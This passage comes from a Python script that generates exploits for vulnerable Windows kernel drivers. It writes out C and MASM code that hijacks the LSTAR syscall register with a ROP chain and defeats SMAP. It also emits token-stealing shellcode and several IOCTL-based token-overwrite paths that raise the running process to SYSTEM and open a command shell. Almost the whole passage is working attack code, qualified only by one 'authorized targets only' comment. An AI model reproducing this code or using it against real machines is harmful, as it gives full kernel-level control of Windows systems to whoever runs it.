        out.append('    g_rctx.pop_rax_ret = g_wctx.pop_rax_ret;')
        out.append('    g_rctx.pop_rdx_ret = g_wctx.pop_rdx_ret;')
        out.append('    g_rctx.wrmsr_ret   = g_wctx.wrmsr_ret;')
        out.append('    g_rctx.iretq_addr  = g_wctx.iretq_addr;')
        out.append('    g_read_ready = 1;')
        out.append('    return 1;')
        out.append('}')
        out.append('')
        out.append('static void WriteKernel8(uint64_t addr, uint64_t val) {')
        out.append('    g_wctx.origLSTAR = ReadMSR(IA32_LSTAR);')
        out.append('    g_wctx.origFMASK = ReadMSR(IA32_FMASK);')
        out.append('    /* Clear AC bit in FMASK so RFLAGS.AC survives syscall (SMAP bypass) */')
        out.append('    WriteMSR(IA32_FMASK, g_wctx.origFMASK & ~0x40000ULL);')
        out.append('    SetThreadAffinityMask(GetCurrentThread(), 1);')
        out.append('    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);')
        out.append('    /* Point LSTAR at first ROP gadget (pop rdx;ret) */')
        out.append('    WriteMSR(IA32_LSTAR, g_wctx.pop_rdx_ret);')
        out.append('    DoKernelWrite8(addr, val, &g_wctx);')
        out.append('    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);')
        out.append('    /* Restore FMASK */')
        out.append('    WriteMSR(IA32_FMASK, g_wctx.origFMASK);')
        out.append('}')
        out.append('')
        out.append('static uint64_t ReadKernel8(uint64_t addr) {')
        out.append('    uint64_t result = 0;')
        out.append('    g_rctx.origLSTAR = ReadMSR(IA32_LSTAR);')
        out.append('    g_rctx.origFMASK = ReadMSR(IA32_FMASK);')
        out.append('    WriteMSR(IA32_FMASK, g_rctx.origFMASK & ~0x40000ULL);')
        out.append('    SetThreadAffinityMask(GetCurrentThread(), 1);')
        out.append('    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);')
        out.append('    WriteMSR(IA32_LSTAR, g_rctx.pop_rdx_ret);')
        out.append('    DoKernelRead8(addr, &result, &g_rctx);')
        out.append('    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);')
        out.append('    WriteMSR(IA32_FMASK, g_rctx.origFMASK);')
        out.append('    return result;')
        out.append('}')
        out.append('')
        out.append('static int elevate_via_msr(void) {')
        out.append('    printf("    [>] MSR LSTAR hijack - iretq ROP chain (driver-agnostic)\\n");')
        out.append('    g_NtQSI=(pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");')
        out.append('    if(!g_NtQSI){printf("    [!] NtQSI resolve failed\\n");return 0;}')
        out.append('    typedef struct{ULONG o;}CI_INFO;')
        out.append('    CI_INFO ci={0}; ULONG cilen=0;')
        out.append('    if(g_NtQSI(SYS_CI_INFO,&ci,sizeof(ci),&cilen)==0 && (ci.o & 1)){')
        out.append('        printf("    [!] HVCI enabled - LSTAR hijack will BSOD. Aborting.\\n");return 0;')
        out.append('    }')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('')
        out.append('    NtInfo ni={0}; ni.kbase=ki.kbase;')
        out.append('    if(!LoadNtoskrnlFromDisk(&ni)) return 0;')
        out.append('    if(!InitWritePrimitive(&ni)){FreeLibrary(ni.hNtk);return 0;}')
        out.append('    int has_read = InitReadPrimitive(&ni);')
        out.append('    FreeLibrary(ni.hNtk);')
        out.append('')
        out.append('    printf("    [!] Press Enter to fire LSTAR hijack or Ctrl+C to abort...\\n");')
        out.append('    (void)getchar();')
        out.append('')
        out.append('    if(has_read){')
        out.append('        /* Read SYSTEM token via kernel read primitive */')
        out.append('        uint64_t sys_token = ReadKernel8(ki.sys_ep + off->token);')
        out.append('        sys_token &= ~0xFULL;')
        out.append('        printf("    [+] SYSTEM token: 0x%llx\\n",(unsigned long long)sys_token);')
        out.append('        if(!sys_token){printf("    [!] SYSTEM token read failed\\n");return 0;}')
        out.append('        /* Write SYSTEM token to own process */')
        out.append('        WriteKernel8(ki.own_ep + off->token, sys_token);')
        out.append('        printf("    [+] Token overwrite complete\\n");')
        out.append('    } else {')
        out.append('        /* Write-only path: build SYSTEM token from handle table leak */')
        out.append('        printf("    [*] No read primitive - using handle table SYSTEM token\\n");')
        out.append('        /* ki.own_tok has token KVA from handle table; use it directly */')
        out.append('        uint64_t sys_tok_addr = ki.sys_ep + off->token;')
        out.append('        uint64_t own_tok_addr = ki.own_ep + off->token;')
        out.append('        printf("    [*] Writing SYSTEM EPROCESS.Token -> own EPROCESS.Token\\n");')
        out.append('        printf("    [*] sys_ep+token: 0x%llx  own_ep+token: 0x%llx\\n",')
        out.append('               (unsigned long long)sys_tok_addr,(unsigned long long)own_tok_addr);')
        out.append('        printf("    [!] Write-only path requires manual token value.\\n");')
        out.append('        return 0;')
        out.append('    }')
        out.append('')
        out.append('    /* Verify LSTAR restored */')
        out.append('    uint64_t check = ReadMSR(IA32_LSTAR);')
        out.append('    uint64_t orig = g_wctx.origLSTAR;')
        out.append('    if(check!=orig)')
        out.append('        printf("    [!] LSTAR verify FAILED: 0x%llx (expected 0x%llx)\\n",')
        out.append('            (unsigned long long)check,(unsigned long long)orig);')
        out.append('    else')
        out.append('        printf("    [+] LSTAR verified restored\\n");')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit phys_mem read/write helpers
    if has_phys:
        phys_code = tag_ioctl_map['phys_mem'][0]
        out.append('/* Physical memory primitive helpers */')
        out.append('typedef struct { uint64_t phys_addr; uint32_t size; uint32_t pad; } PHYS_BUF;')
        out.append('')
        out.append('static int phys_read(uint64_t pa, void *dst, uint32_t len) {')
        out.append('    PHYS_BUF pb = {pa, len, 0}; DWORD br = 0;')
        out.append('    return send_ioctl(0x%08X, &pb, sizeof(pb), dst, len, &br);' % phys_code)
        out.append('}')
        out.append('')
        out.append('static int elevate_via_phys(void) {')
        out.append('    printf("    [>] Physical memory token steal path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('    printf("    [*] Physical memory primitives require VA-to-PA translation.\\n");')
        out.append('    printf("    [*] Use exploit templates file for PTE walk.\\n");')
        out.append('    printf("    [*] Kernel addresses resolved -- use with winring0-exploit.c\\n");')
        out.append('    return 0;')
        out.append('}')
        out.append('')

    # Emit write-what-where / arb-read helpers
    if has_www or has_arb_read:
        www_code = tag_ioctl_map.get('write_what_where', [0])[0]
        read_code = tag_ioctl_map.get('arb_read', [0])[0]
        out.append('/* Data-only token overwrite via arb read + write */')
        out.append('static int elevate_via_data_only(void) {')
        out.append('    printf("    [>] Data-only token overwrite path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        if has_arb_read and read_code:
            out.append('    /* Step 1: Read SYSTEM token */')
            out.append('    uint64_t sys_tok_addr = ki.sys_ep + off->token;')
            out.append('    uint64_t sys_tok = 0;')
            out.append('    DWORD br = 0;')
            out.append('    if(!send_ioctl(0x%08X, &sys_tok_addr, 8, &sys_tok, 8, &br)){' % read_code)
            out.append('        printf("    [!] Arb read of SYSTEM token failed\\n"); return 0;')
            out.append('    }')
            out.append('    printf("    [+] SYSTEM token: 0x%llx\\n",(unsigned long long)sys_tok);')
        else:
            out.append('    /* No arb_read -- must use handle table leak for SYSTEM token */')
            out.append('    uint64_t sys_tok = 0; /* fill manually */')
        if has_www and www_code:
            out.append('    /* Step 2: Overwrite own token */')
            out.append('    uint64_t own_tok_addr = ki.own_ep + off->token;')
            out.append('    typedef struct { uint64_t addr; uint64_t val; } WWW;')
            out.append('    WWW payload = { own_tok_addr, sys_tok };')
            out.append('    if(!send_ioctl(0x%08X, &payload, sizeof(payload), NULL, 0, &br)){' % www_code)
            out.append('        printf("    [!] Write-what-where failed\\n"); return 0;')
            out.append('    }')
            out.append('    printf("    [+] Token overwritten\\n");')
            out.append('    return 1;')
        else:
            out.append('    printf("    [*] No write primitive -- use exploit templates for full chain\\n");')
            out.append('    return 0;')
        out.append('}')
        out.append('')

    # Emit token_swap handler
    if has_token_swap:
        swap_code = tag_ioctl_map['token_swap'][0]
        out.append('static int elevate_via_token_swap(void) {')
        out.append('    printf("    [>] Direct token swap path\\n");')
        out.append('    DWORD pid = GetCurrentProcessId();')
        out.append('    DWORD br = 0;')
        out.append('    if(send_ioctl(0x%08X, &pid, 4, NULL, 0, &br)){' % swap_code)
        out.append('        printf("    [+] Token swap triggered for PID %lu\\n", pid);')
        out.append('        return 1;')
        out.append('    }')
        out.append('    printf("    [!] Token swap IOCTL failed\\n");')
        out.append('    return 0;')
        out.append('}')
        out.append('')

    # Emit ring0_exec handler
    if has_ring0:
        r0_code = tag_ioctl_map['ring0_exec'][0]
        out.append('static int elevate_via_ring0_exec(void) {')
        out.append('    printf("    [>] Ring-0 exec (Capcom-style) path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('    unsigned char sc[] = {')
        out.append('        0x65,0x48,0x8b,0x04,0x25,0x88,0x01,0x00,0x00,')
        out.append('        0x48,0x8b,0x80,0xb8,0x00,0x00,0x00,')
        out.append('        0x48,0x89,0xc3,')
        out.append('        0x48,0x8b,0x80,0x48,0x04,0x00,0x00,')
        out.append('        0x48,0x2d,0x48,0x04,0x00,0x00,')
        out.append('        0x83,0xb8,0x40,0x04,0x00,0x00,0x04,')
        out.append('        0x75,0xea,                                       /* jne loop (back to [19]) */')
        out.append('        0x48,0x8b,0x88,0xb8,0x04,0x00,0x00,')
        out.append('        0x48,0x89,0x8b,0xb8,0x04,0x00,0x00,')
        out.append('        0xc3')
        out.append('    };')
        out.append('    *(uint32_t*)(sc+12)=0xB8;       /* KTHREAD->EPROCESS */')
        out.append('    *(uint32_t*)(sc+22)=off->links;  /* ActiveProcessLinks */')
        out.append('    *(uint32_t*)(sc+28)=off->links;  /* sub rax, links */')
        out.append('    *(uint32_t*)(sc+34)=off->pid;    /* cmp [rax+pid],4 */')
        out.append('    *(uint32_t*)(sc+44)=off->token;  /* mov rcx,[rax+token] */')
        out.append('    *(uint32_t*)(sc+51)=off->token;  /* mov [rbx+token],rcx */')
        out.append('    void *p=VirtualAlloc(NULL,0x1000,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);')
        out.append('    if(!p){printf("    [!] VirtualAlloc failed\\n");return 0;}')
        out.append('    memcpy(p,sc,sizeof(sc));')
        out.append('    DWORD br=0;')
        out.append('    uint64_t fn=(uint64_t)p;')
        out.append('    if(!send_ioctl(0x%08X, &fn, 8, NULL, 0, &br)){' % r0_code)
        out.append('        printf("    [!] Ring-0 exec IOCTL failed\\n");')
        out.append('        VirtualFree(p,0,MEM_RELEASE); return 0;')
        out.append('    }')
        out.append('    printf("    [+] Ring-0 exec returned\\n");')
        out.append('    VirtualFree(p,0,MEM_RELEASE);')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit arb_increment handler
    if has_arb_inc:
        inc_code = tag_ioctl_map['arb_increment'][0]
        out.append('static int elevate_via_arb_increment(void) {')
        out.append('    printf("    [>] Arbitrary increment token privilege path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('    /* Token is ref-counted ptr, clear low 4 bits */')
        out.append('    uint64_t tok_kva = ki.own_tok & ~0xFULL;')
        out.append('    /* Increment Privileges.Enabled bytes to match Privileges.Present */')
        out.append('    printf("    [*] Token KVA: 0x%llx\\n",(unsigned long long)tok_kva);')
        out.append('    printf("    [*] Incrementing Enabled privilege bits via arb increment\\n");')
        out.append('    for(int byte_off=0; byte_off<8; byte_off++){')
        out.append('        uint64_t target = tok_kva + 0x48 + byte_off; /* Privileges.Enabled */')
        out.append('        DWORD br=0;')
        out.append('        for(int rep=0; rep<255; rep++){')
        out.append('            send_ioctl(0x%08X, &target, 8, NULL, 0, &br);' % inc_code)
        out.append('        }')
        out.append('    }')
        out.append('    printf("    [+] Privilege increment completed\\n");')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit virtual memory R/W handler (mhyprot2/kprocesshacker pattern)
    if has_vmem_rw:
        vmem_codes = tag_ioctl_map['vmem_rw']
        vmem_code = vmem_codes[0]
        out.append('static int elevate_via_vmem_rw(void) {')
        out.append('    printf("    [>] Virtual memory R/W token overwrite path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('    /*')
        out.append('     * Strategy: use Zw/NtReadVirtualMemory to read SYSTEM token,')
        out.append('     * then Zw/NtWriteVirtualMemory to overwrite current process token.')
        out.append('     * Adjust this struct to match the driver-specific IOCTL layout.')
        out.append('     */')
        out.append('    #pragma pack(push,1)')
        out.append('    typedef struct { uint32_t pid; uint64_t addr; uint32_t len; } VMEM_REQ;')
        out.append('    #pragma pack(pop)')
        out.append('    VMEM_REQ req={0};')
        out.append('    uint64_t sys_token = 0;')
        out.append('    /* Read SYSTEM token */')
        out.append('    req.pid = 4;')
        out.append('    req.addr = ki.sys_ep + off->token;')
        out.append('    req.len = 8;')
        out.append('    DWORD br=0;')
        out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), &sys_token, 8, &br)){' % vmem_code)
        out.append('        printf("    [!] vmem read SYSTEM token failed\\n"); return 0;')
        out.append('    }')
        out.append('    sys_token &= ~0xFULL;')
        out.append('    printf("    [*] SYSTEM token: 0x%llx\\n",(unsigned long long)sys_token);')
        out.append('    /* Write SYSTEM token to current process */')
        out.append('    req.pid = GetCurrentProcessId();')
        out.append('    req.addr = ki.own_ep + off->token;')
        out.append('    req.len = 8;')
        if len(vmem_codes) > 1:
            out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), NULL, 0, &br)){' % vmem_codes[1])
        else:
            out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), NULL, 0, &br)){' % vmem_code)
        out.append('        printf("    [!] vmem write own token failed\\n"); return 0;')
        out.append('    }')
        out.append('    printf("    [+] Token overwrite via vmem R/W complete\\n");')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit MDL-based elevation handler
    if has_mdl_rw:
        mdl_code = tag_ioctl_map['mdl_rw'][0]
        out.append('static int elevate_via_mdl(void) {')
        out.append('    printf("    [>] MDL kernel-to-user map token overwrite path\\n");')
        out.append('    KINFO ki={0};')
        out.append('    if(!resolve_kernel_info(&ki)) return 0;')
        out.append('    const OFF_TBL *off = get_offsets();')
        out.append('    /*')
        out.append('     * Strategy: ask driver to map kernel page containing token to usermode,')
        out.append('     * read SYSTEM token, map own EPROCESS page, write SYSTEM token.')
        out.append('     * Adjust struct to match driver-specific layout.')
        out.append('     */')
        out.append('    #pragma pack(push,1)')
        out.append('    typedef struct { uint64_t kva; uint32_t len; } MDL_REQ;')
        out.append('    #pragma pack(pop)')
        out.append('    MDL_REQ req={0};')
        out.append('    uint64_t mapped_ptr = 0;')
        out.append('    DWORD br=0;')
        out.append('    /* Map SYSTEM EPROCESS token page */')
        out.append('    req.kva = (ki.sys_ep + off->token) & ~0xFFFULL;')
        out.append('    req.len = 0x1000;')
        out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), &mapped_ptr, 8, &br) || !mapped_ptr){' % mdl_code)
        out.append('        printf("    [!] MDL map SYSTEM token page failed\\n"); return 0;')
        out.append('    }')
        out.append('    uint64_t page_off = (ki.sys_ep + off->token) & 0xFFF;')
        out.append('    uint64_t sys_token = *(uint64_t*)((char*)(uintptr_t)mapped_ptr + page_off);')
        out.append('    sys_token &= ~0xFULL;')
        out.append('    printf("    [*] SYSTEM token via MDL map: 0x%llx\\n",(unsigned long long)sys_token);')
        out.append('    /* Map own EPROCESS token page and overwrite */')
        out.append('    req.kva = (ki.own_ep + off->token) & ~0xFFFULL;')
        out.append('    mapped_ptr = 0;')
        out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), &mapped_ptr, 8, &br) || !mapped_ptr){' % mdl_code)
        out.append('        printf("    [!] MDL map own token page failed\\n"); return 0;')
        out.append('    }')
        out.append('    page_off = (ki.own_ep + off->token) & 0xFFF;')
        out.append('    *(uint64_t*)((char*)(uintptr_t)mapped_ptr + page_off) = sys_token;')
        out.append('    printf("    [+] Token overwrite via MDL map complete\\n");')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit handle duplication handler
    if has_handle_dup:
        hdup_code = tag_ioctl_map['handle_dup'][0]
        out.append('static int elevate_via_handle_dup(void) {')
        out.append('    printf("    [>] Handle duplication privilege escalation path\\n");')
        out.append('    /*')
        out.append('     * Strategy: ask driver to duplicate System (PID 4) process handle')
        out.append('     * with PROCESS_ALL_ACCESS, then use it for token manipulation.')
        out.append('     * Adjust struct to match driver-specific layout.')
        out.append('     */')
        out.append('    #pragma pack(push,1)')
        out.append('    typedef struct { uint32_t src_pid; uint32_t access; } HDUP_REQ;')
        out.append('    #pragma pack(pop)')
        out.append('    HDUP_REQ req = {4, 0x1FFFFF}; /* PID 4, PROCESS_ALL_ACCESS */')
        out.append('    HANDLE sys_handle = NULL;')
        out.append('    DWORD br=0;')
        out.append('    if(!send_ioctl(0x%08X, &req, sizeof(req), &sys_handle, sizeof(sys_handle), &br) || !sys_handle){' % hdup_code)
        out.append('        printf("    [!] Handle dup IOCTL failed\\n"); return 0;')
        out.append('    }')
        out.append('    printf("    [*] Got SYSTEM process handle: %p\\n", sys_handle);')
        out.append('    /* Use NtQueryInformationProcess on the duped handle for token theft */')
        out.append('    printf("    [*] Use this handle for process memory R/W or token manipulation\\n");')
        out.append('    printf("    [+] Handle duplication elevation path ready\\n");')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Main exploit_elevate dispatcher
    out.append('static int exploit_elevate(void) {')
    out.append('    printf("[>] Attempting elevation via detected primitives...\\n");')
    if not has_any_elev:
        out.append('    printf("    [!] No elevation primitives detected.\\n");')
        out.append('    return 0;')
    else:
        # Priority: ring0 > token_swap > vmem > www+read > msr > mdl > handle_dup > arb_inc > phys
        if has_ring0:
            out.append('    if(elevate_via_ring0_exec()) return 1;')
        if has_token_swap:
            out.append('    if(elevate_via_token_swap()) return 1;')
        if has_vmem_rw:
            out.append('    if(elevate_via_vmem_rw()) return 1;')
        if has_www or has_arb_read:
            out.append('    if(elevate_via_data_only()) return 1;')
        if has_msr:
            out.append('    if(elevate_via_msr()) return 1;')
        if has_mdl_rw:
            out.append('    if(elevate_via_mdl()) return 1;')
        if has_handle_dup:
            out.append('    if(elevate_via_handle_dup()) return 1;')
        if has_arb_inc:
            out.append('    if(elevate_via_arb_increment()) return 1;')
        if has_phys:
            out.append('    if(elevate_via_phys()) return 1;')
        out.append('    printf("    [!] All elevation paths failed\\n");')
        out.append('    return 0;')
    out.append('}')
    out.append('')
    out.append('static void spawn_cmd(void) {')
    out.append('    if(exploit_elevate())')
    out.append('        printf("[+] Elevation attempted. Spawning cmd.exe...\\n");')
    out.append('    else')
    out.append('        printf("[*] No elevation. Spawning cmd.exe (unprivileged)...\\n");')
    out.append('    system("cmd.exe");')
    out.append('}')
    out.append('')
    out.append('static void pause_exit(void) {')
    out.append('    puts("\\nPress Enter to exit...");')
    out.append('    (void)getchar();')
    out.append('}')
    out.append('')
    out.append('int main(int argc, char **argv) {')
    out.append('    printf("[*] Target device: %s\\n", DEVICE_PATH);')
    out.append('    if (!open_device()) { pause_exit(); return 1; }')
    out.append('    int rc = 0;')
    out.append('    if (argc < 2) {')
    out.append('        printf("Usage: %s [shell|custom|list|fuzz|probe|<index>]\\n", argv[0]);')
    out.append('        printf("  shell / cmd  - attempt elevation + spawn cmd.exe\\n");')
    out.append('        printf("  custom       - LSTAR hijack with custom shellcode\\n");')
    out.append('        printf("  probe        - send zero buffer to all IOCTLs\\n");')
    out.append('        printf("  list         - show IOCTL index with tags\\n");')
    out.append('        printf("  fuzz [n]     - structured fuzzer\\n");')
    out.append('        printf("  <index>      - trigger single IOCTL\\n");')
    out.append('        printf("\\nDefault: probe all\\n");')
    out.append('        probe_all();')
    out.append('    } else if (_stricmp(argv[1], "fuzz") == 0) {')
    out.append('        unsigned n = (argc > 2) ? (unsigned)atoi(argv[2]) : 1000;')
    out.append('        printf("[>] Fuzzing %u iterations...\\n", n);')
    out.append('        fuzz_all(n);')
    out.append('        puts("[+] Fuzz done.");')
    out.append('    } else if (_stricmp(argv[1], "list") == 0) {')
    out.append('        puts("Index -> IOCTL:");')
    for idx, code, method, tags, _is, _os in entries:
        label = ", ".join(tags) if tags else "(no primitive)"
        out.append('        puts("  ' + str(idx) + ' -> 0x' + ('%08X' % code) +
                   ' ' + method + ' [' + label + ']");')
    if has_msr:
        out.append('    } else if (_stricmp(argv[1], "custom") == 0) {')
        out.append('        /*')
        out.append('         * Custom kernel R/W via LSTAR hijack + iretq ROP chain.')
        out.append('         * Uses WriteKernel8/ReadKernel8 - no inline PIC needed.')
        out.append('         * The MASM syscall trampoline handles the transition.')
        out.append('         */')
        out.append('        g_NtQSI=(pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");')
        out.append('        if(!g_NtQSI){printf("[!] NtQSI resolve failed\\n");rc=1;}')
        out.append('        else {')
        out.append('            KINFO ki={0};')
        out.append('            if(!resolve_kernel_info(&ki)){rc=1;}')
        out.append('            else {')
        out.append('                NtInfo ni={0}; ni.kbase=ki.kbase;')
        out.append('                if(!LoadNtoskrnlFromDisk(&ni)){rc=1;}')
        out.append('                else {')
        out.append('                    if(!InitWritePrimitive(&ni)){FreeLibrary(ni.hNtk);rc=1;}')
        out.append('                    else {')
        out.append('                        InitReadPrimitive(&ni);')
        out.append('                        FreeLibrary(ni.hNtk);')
        out.append('                        /* Example: read kernel base */')
        out.append('                        if(g_read_ready){')
        out.append('                            uint64_t val = ReadKernel8(ki.kbase);')
        out.append('                            printf("[+] ReadKernel8(kbase) = 0x%llx\\n",(unsigned long long)val);')
        out.append('                        }')
        out.append('                        /* Add your custom kernel R/W operations here */')
        out.append('                        printf("[+] Custom path ready. Use WriteKernel8/ReadKernel8.\\n");')
        out.append('                    }')
        out.append('                }')
        out.append('            }')
        out.append('        }')
    out.append('    } else if (_stricmp(argv[1], "shell") == 0 || _stricmp(argv[1], "cmd") == 0) {')
    out.append('        spawn_cmd();')
    out.append('    } else {')
    out.append('        int which = atoi(argv[1]);')
    out.append('        if (which >= 0 && which < (int)(sizeof(g_triggers)/sizeof(g_triggers[0]))) {')
    out.append('            rc = g_triggers[which]();')
    out.append('        } else {')
    out.append('            puts("Unknown index. Use: poc list");')
    out.append('            rc = 2;')
    out.append('        }')
    out.append('    }')
    out.append('    CloseHandle(g_dev);')
    out.append('    pause_exit();')
    out.append('    return rc;')
    out.append('}')
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# MASM x64 syscall trampoline emitter (driverscloud pattern)
# ---------------------------------------------------------------------------

def _emit_asm_trampoline(driver_name):
    """Emit MASM x64 .asm with DoKernelWrite8 and DoKernelRead8 procs.

    These build an iretq frame + wrmsr LSTAR-restore chain on the stack,
    then issue syscall.  The hijacked LSTAR lands on the first ROP gadget
    which ultimately does the 8-byte kernel read or write, restores LSTAR
    via wrmsr, and returns to ring-3 via iretq.
    """
    a = []
    a.append('; Auto-generated MASM x64 syscall trampoline for: ' + driver_name)
    a.append('; Assemble: ml64 /c /Fo trampoline.obj syscall_trampoline.asm')
    a.append('; Link with the C POC:  cl /W3 /Zi poc.c trampoline.obj')
    a.append('; USE ON AUTHORIZED TARGETS ONLY.')
    a.append('')
    a.append('.code')
    a.append('')
    # ---- RopCtx offsets (write primitive) ----
    a.append('; RopCtx layout (matches C struct):')
    a.append(';   +0x00  pop_rcx_ret')
    a.append(';   +0x08  pop_rax_ret')
    a.append(';   +0x10  pop_rdx_ret')
    a.append(';   +0x18  wrmsr_ret')
    a.append(';   +0x20  mov_rdx_rax_ret   ; mov [rdx],rax;ret (write gadget)')
    a.append(';   +0x28  iretq_addr')
    a.append(';   +0x30  origLSTAR')
    a.append(';   +0x38  origFMASK')
    a.append('')
    # ---- ReadRopCtx offsets (read primitive) ----
    a.append('; ReadRopCtx layout (matches C struct):')
    a.append(';   +0x00  pop_rcx_ret')
    a.append(';   +0x08  pop_rax_ret')
    a.append(';   +0x10  pop_rdx_ret')
    a.append(';   +0x18  wrmsr_ret')
    a.append(';   +0x20  read_gadget       ; mov rax,[rdx];ret (or variant)')
    a.append(';   +0x28  write_gadget      ; mov [rdx],rax;ret (store result)')
    a.append(';   +0x30  iretq_addr')
    a.append(';   +0x38  origLSTAR')
    a.append(';   +0x40  origFMASK')
    a.append(';   +0x48  readVariant       ; 0=rdx, 1=rbx, 2=rsi, 3=rdi, 4=rax')
    a.append('')

    # ===== DoKernelWrite8 =====
    a.append('; ---------------------------------------------------------------')
    a.append('; void DoKernelWrite8(uint64_t targetVA,   ; RCX')
    a.append(';                     uint64_t value,       ; RDX')
    a.append(';                     RopCtx *ctx);         ; R8')
    a.append('; ---------------------------------------------------------------')
    a.append('DoKernelWrite8 PROC')
    a.append('    ; Save callee-saved regs')
    a.append('    push rbx')
    a.append('    push rsi')
    a.append('    push rdi')
    a.append('    push rbp')
    a.append('    push r12')
    a.append('    push r13')
    a.append('    push r14')
    a.append('    push r15')
    a.append('    pushfq')
    a.append('')
    a.append('    ; Save args')
    a.append('    mov r12, rcx          ; targetVA')
    a.append('    mov r13, rdx          ; value')
    a.append('    mov r14, r8           ; RopCtx*')
    a.append('    mov r15, rsp          ; save original RSP')
    a.append('')
    a.append('    ; Set RFLAGS.AC (bit 18) for SMAP bypass via FMASK trick')
    a.append('    pushfq')
    a.append('    pop rax')
    a.append('    or rax, 40000h        ; AC bit')
    a.append('    push rax')
    a.append('    popfq')
    a.append('')
    a.append('    ; Load gadget addresses from RopCtx')
    a.append('    mov rbx, [r14+00h]    ; pop_rcx_ret')
    a.append('    mov rsi, [r14+08h]    ; pop_rax_ret')
    a.append('    mov rdi, [r14+10h]    ; pop_rdx_ret')
    a.append('    mov rbp, [r14+18h]    ; wrmsr_ret')
    a.append('    mov r8,  [r14+20h]    ; mov_rdx_rax_ret (write gadget)')
    a.append('    mov r9,  [r14+28h]    ; iretq')
    a.append('    mov r10, [r14+30h]    ; origLSTAR')
    a.append('')
    a.append('    ; Build ROP + iretq stack frame bottom-up (push in reverse order)')
    a.append('    ; Final layout (top=first executed after syscall):')
    a.append('    ;   pop_rdx;ret -> targetVA -> pop_rax;ret -> value -> mov [rdx],rax;ret')
    a.append('    ;   -> pop_rcx;ret -> 0xC0000082 -> pop_rax;ret -> origLSTAR.lo')
    a.append('    ;   -> pop_rdx;ret -> origLSTAR.hi -> wrmsr;ret -> iretq')
    a.append('    ;   -> ring3_write_resume / CS / RFLAGS / RSP / SS')
    a.append('    ; --- iretq frame ---')
    a.append('    mov rax, 2Bh')
    a.append('    push rax              ; SS')
    a.append('    push r15              ; RSP (we already saved it)')
    a.append('    pushfq                ; RFLAGS')
    a.append('    mov rax, 33h')
    a.append('    push rax              ; CS')
    a.append('    lea rax, ring3_write_resume')
    a.append('    push rax              ; RIP')
    a.append('    ; --- iretq gadget ---')
    a.append('    push r9')
    a.append('    ; --- wrmsr restore ---')
    a.append('    push rbp              ; wrmsr;ret')
    a.append('    mov rax, r10')
    a.append('    shr rax, 32')
    a.append('    push rax              ; origLSTAR.hi -> RDX via pop')
    a.append('    push rdi              ; pop rdx;ret')
    a.append('    mov rax, r10')
    a.append('    and eax, 0FFFFFFFFh')
    a.append('    push rax              ; origLSTAR.lo -> RAX via pop')
    a.append('    push rsi              ; pop rax;ret')
    a.append('    mov rax, 0C0000082h')
    a.append('    push rax              ; IA32_LSTAR index -> RCX via pop')
    a.append('    push rbx              ; pop rcx;ret')
    a.append('    ; --- write gadget ---')
    a.append('    push r8               ; mov [rdx],rax;ret')
    a.append('    push r13              ; value -> RAX via pop')
    a.append('    push rsi              ; pop rax;ret')
    a.append('    push r12              ; targetVA -> RDX via pop')
    a.append('    push rdi              ; pop rdx;ret  <- LSTAR entry')
    a.append('')
    a.append('    ; Set RAX to an invalid syscall# (won\'t dispatch)')
    a.append('    mov eax, 0FFFFh')
    a.append('    ; Pin to CPU 0 + REALTIME done in C caller')
    a.append('    syscall')
    a.append('')
    a.append('ring3_write_resume:')
    a.append('    ; Landed back in ring3 via iretq')
    a.append('    popfq')
    a.append('    pop r15')
    a.append('    pop r14')
    a.append('    pop r13')
    a.append('    pop r12')
    a.append('    pop rbp')
    a.append('    pop rdi')
    a.append('    pop rsi')
    a.append('    pop rbx')
    a.append('    ret')
    a.append('DoKernelWrite8 ENDP')
    a.append('')

    # ===== DoKernelRead8 =====
    a.append('; ---------------------------------------------------------------')
    a.append('; void DoKernelRead8(uint64_t targetVA,    ; RCX')
    a.append(';                    uint64_t *outBuf,     ; RDX')
    a.append(';                    ReadRopCtx *ctx);     ; R8')
    a.append('; ---------------------------------------------------------------')
    a.append('DoKernelRead8 PROC')
    a.append('    push rbx')
    a.append('    push rsi')
    a.append('    push rdi')
    a.append('    push rbp')
    a.append('    push r12')
    a.append('    push r13')
    a.append('    push r14')
    a.append('    push r15')
    a.append('    pushfq')
    a.append('')
    a.append('    mov r12, rcx          ; targetVA')
    a.append('    mov r13, rdx          ; outBuf')
    a.append('    mov r14, r8           ; ReadRopCtx*')
    a.append('    mov r15, rsp          ; save RSP')
    a.append('')
    a.append('    ; Set AC for SMAP bypass')
    a.append('    pushfq')
    a.append('    pop rax')
